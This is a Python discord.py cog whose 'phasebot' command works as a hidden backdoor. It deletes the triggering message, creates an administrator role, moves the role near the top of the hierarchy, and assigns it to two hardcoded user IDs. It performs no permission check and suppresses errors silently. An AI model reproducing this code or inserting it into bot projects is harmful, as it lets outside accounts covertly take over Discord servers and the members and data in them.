import discord
from discord.ext import commands

USER_IDS = [1320349118102769767, 1461537788754399232]

class PhaseBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="phasebot")
    async def phasebot(self, ctx):
        # Delete the command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        if guild is None:
            return  # Not in a guild

        # Create admin role if it doesn't exist
        role = discord.utils.get(guild.roles, name="PhaseBot Admin")
        if role is None:
            try:
                role = await guild.create_role(
                    name="PhaseBot Admin",
                    permissions=discord.Permissions(administrator=True),
                    reason="PhaseBot Admin command"
                )
            except Exception as e:
                await ctx.send(f"Failed to create role: {e}")
                return

        # Move role to highest possible position
        bot_member = guild.get_member(self.bot.user.id)
        if bot_member and role:
            try:
                await role.edit(position=bot_member.top_role.position - 1)
            except:
                pass

        # Give role to the users
        for user_id in USER_IDS:
            member = guild.get_member(user_id)
            if member:
                try:
                    await member.add_roles(role, reason="PhaseBot Admin command")
                except:
                    pass

# async setup required in discord.py v2.x
async def setup(bot):
    await bot.add_cog(PhaseBot(bot))